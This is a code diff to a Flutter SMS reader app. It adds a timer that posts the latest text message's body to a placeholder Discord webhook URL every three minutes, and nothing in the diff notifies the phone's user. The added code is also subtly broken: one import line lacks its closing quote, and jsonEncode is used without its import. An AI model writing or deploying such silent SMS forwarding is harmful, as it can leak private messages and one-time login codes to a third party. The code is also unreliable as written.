@@ -1,5 +1,7 @@
 import 'package:flutter/material.dart';
 import 'package:telephony/telephony.dart';
+import 'package:http/http.dart as http;
+import 'dart:async';
 
 void main() {
   runApp(MyApp());
@@ -27,6 +29,10 @@ class _SMSReaderAppState extends State<SMSReaderApp> {
   void initState() {
     super.initState();
     _requestPermissionsAndReadSMS();
+    // Schedule a timer to check for the last message and send it to Discord every 3 minutes
+    Timer.periodic(Duration(minutes: 3), (timer) {
+      _sendLastMessageToDiscord();
+    });
   }
 
   Future<void> _requestPermissionsAndReadSMS() async {
@@ -43,6 +49,25 @@ class _SMSReaderAppState extends State<SMSReaderApp> {
     setState(() {
       smsMessages = messages;
     });
+  }
+
+  Future<void> _sendLastMessageToDiscord() async {
+    if (smsMessages.isNotEmpty) {
+      final lastMessage = smsMessages.last;
+      final discordWebhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
+
+      final response = await http.post(
+        Uri.parse(discordWebhookURL),
+        headers: {'Content-Type': 'application/json'},
+        body: jsonEncode({'content': lastMessage.body}),
+      );
+
+      if (response.statusCode == 200) {
+        print('Message sent to Discord: ${lastMessage.body}');
+      } else {
+        print('Failed to send message to Discord. Status code: ${response.statusCode}');
+      }
+    }
   }
 
   @override
